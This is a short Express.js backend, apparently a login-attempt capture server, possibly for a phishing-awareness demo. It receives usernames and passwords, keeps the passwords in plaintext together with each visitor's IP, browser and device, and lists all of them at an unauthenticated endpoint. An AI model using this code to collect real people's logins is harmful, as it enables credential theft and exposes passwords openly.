import express from "express";
import cors from "cors";
import { UAParser } from "ua-parser-js";

const app = express();
const PORT = process.env.PORT || 3001;
const MAX_IDADE_MS = 10 * 60 * 1000;
const LIMPEZA_INTERVALO_MS = 60 * 1000;

/** @type {Array<Record<string, unknown>>} */
const tentativas = [];

app.use(cors());
app.use(express.json());

function expirarAntigas() {
  const limite = Date.now() - MAX_IDADE_MS;
  for (let i = tentativas.length - 1; i >= 0; i -= 1) {
    if (new Date(tentativas[i].dataHora).getTime() <= limite) {
      tentativas.splice(i, 1);
    }
  }
}

function getClientIp(req) {
  const forwarded = req.headers["x-forwarded-for"];
  if (typeof forwarded === "string") {
    return forwarded.split(",")[0].trim();
  }
  return req.socket.remoteAddress?.replace("::ffff:", "") || "desconhecido";
}

function detectarNavegador(ua) {
  const agent = String(ua || "").toLowerCase();
  if (/firefox|fxios/.test(agent)) return "Mozilla";
  if (/chrome|crios|chromium|edg|opr/.test(agent)) return "Chrome";
  if (/safari/.test(agent)) return "Safari";
  return "Outro";
}

app.post("/api/tentativa", (req, res) => {
  const { usuario, senha } = req.body ?? {};
  if (!usuario || !senha) {
    return res.status(400).json({ erro: "usuario e senha sao obrigatorios" });
  }

  const parser = new UAParser(req.headers["user-agent"]);
  const os = parser.getOS();
  const device = parser.getDevice();

  const evento = {
    id: crypto.randomUUID(),
    usuario: String(usuario),
    senha: String(senha),
    navegador: detectarNavegador(req.headers["user-agent"]),
    sistema: [os.name, os.version].filter(Boolean).join(" ") || "desconhecido",
    dispositivo: device.type
      ? `${device.type}${device.vendor ? ` (${device.vendor})` : ""}`
      : "Desktop",
    ip: getClientIp(req),
    dataHora: new Date().toISOString(),
  };

  tentativas.unshift(evento);
  console.log("[tentativa]", evento.usuario, "@", evento.dataHora);
  res.status(201).json({ ok: true, id: evento.id });
});

app.get("/api/tentativas", (_req, res) => {
  expirarAntigas();
  res.json(tentativas);
});

app.delete("/api/tentativas", (_req, res) => {
  tentativas.length = 0;
  res.json({ ok: true });
});

app.get("/api/health", (_req, res) => {
  res.json({ status: "ok" });
});

app.listen(PORT, () => {
  console.log(`Backend rodando em http://localhost:${PORT}`);
  expirarAntigas();
  setInterval(expirarAntigas, LIMPEZA_INTERVALO_MS);
});
